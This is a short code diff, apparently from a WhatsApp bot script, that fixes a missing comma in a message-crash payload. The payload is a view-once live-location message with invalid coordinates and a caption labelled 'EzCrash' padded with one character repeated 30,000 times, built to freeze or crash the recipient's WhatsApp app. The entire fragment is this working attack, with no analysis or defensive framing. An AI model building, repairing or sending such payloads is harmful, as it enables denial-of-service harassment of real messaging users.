@@ -12661,7 +12661,7 @@ viewOnceMessage: {
 message: {
   "liveLocationMessage": {
     "degreesLatitude": "p",
-    "degreesLongitude": "p"
+    "degreesLongitude": "p",
     "caption": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(30000),
     "sequenceNumber": "0",
     "jpegThumbnail": ""
